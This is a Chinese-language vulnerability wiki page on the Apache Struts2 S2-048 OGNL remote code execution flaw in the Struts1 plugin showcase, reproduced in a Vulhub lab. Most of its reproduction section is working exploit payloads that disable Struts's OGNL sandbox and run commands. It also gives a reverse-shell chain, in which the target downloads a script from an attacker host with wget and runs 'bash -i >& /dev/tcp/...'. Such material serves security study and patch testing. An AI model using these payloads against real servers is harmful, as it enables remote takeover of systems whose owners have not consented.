---
source: "Threekiii/Vulnerability-Wiki"
title: "Apache Struts2 S2-048 远程代码执行漏洞"
product: "Apache Struts2 Struts1插件showcase"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "S2-048"
referenced_identifiers: "S2-045"
identifier_role: "primary"
prerequisites: "使用存在问题的Struts1插件示例/同样不安全代码；实验showcase2.3.32+Tomcat8.5，Gangster Name触发"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-8182936b738beb1117e701bc"
entity_id: "ve-8182936b738beb1117e701bc"
schema_version: "1"
---

# Apache Struts2 S2-048 远程代码执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：使用存在问题的Struts1插件示例/同样不安全代码；实验showcase2.3.32+Tomcat8.5，Gangster Name触发
- 证据范围：具体功能入口清晰，不能以借用045payload合并漏洞或把showcase问题泛化整个框架。

### 本次正文校订

- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响2.0–2.3.32缺示例插件/实际代码限定，应补官方组件边界
- Gangster/Gengster拼写混用，链接目标裸空格
- 缺主要CVE/修复方案及危险代码根因
- 清空排除集合、写shell均改变状态，正文未告知恢复
- 仅替换沙箱payload不能证明所有历史Struts应用都受影响

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

漏洞详情:

- http://struts.apache.org/docs/s2-048.html
- http://bobao.360.cn/learning/detail/4078.html
- [http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/07/08/S2-048 动态分析/)

## 漏洞影响

影响版本: 2.0.0 - 2.3.32

## 环境搭建

Vulhub 执行以下命令启动 s2-048 测试环境：

```shell
docker-compose build
docker-compose up -d
```

环境是直接下载的 struts-2.3.32 的 showcase，部署在 tomcat-8.5 下。环境启动后，访问 `http://your-ip:8080/showcase/` 即可查看到 struts2 的测试页面。

## 漏洞复现

访问 Integration/Struts 1 Integration：

![image-20220302112924516](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021129614.png)


触发 OGNL 表达式的位置是 `Gangster Name` 这个表单。

输入 `${233*233}` 即可查看执行结果（剩下两个表单随意填写）：

![image-20220302113012978](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021130080.png)


借用 S2-045 的沙盒绕过方法改了一个 POC。将如下 POC 填入表单 `Gengster Name` 中，提交即可直接回显命令执行的结果：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

![image-20220302113039046](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021130143.png)


当然，也可以直接用 s2-045 的 POC（需要在 Burp 下进行测试）：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

![image-20220302113241603](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021132734.png)


### 反弹 shell

使用 s2-045 的 POC 进行反弹 shell。

编写 shell 脚本并启动 http 服务器：

```
echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
python3环境下：python -m http.server 80
```

上传 shell.sh 文件的命令为：

```shell
wget 192.168.174.128/shell.sh
```

上传 shell.sh 文件的 Payload 为（还需要进行 URL 编码）：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget 192.168.174.128/shell.sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

![image-20220302113326283](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021133401.png)


执行 shell.sh 文件的命令为：

```shell
bash shell.sh
```

执行 shell.sh 文件的 Payload 为（还需要进行 URL 编码）：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash shell.sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

成功接收反弹 shell：

![image-20220302113402853](./.resource/Apache-Struts2-S2-048-远程代码执行漏洞/media/202203021134938.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
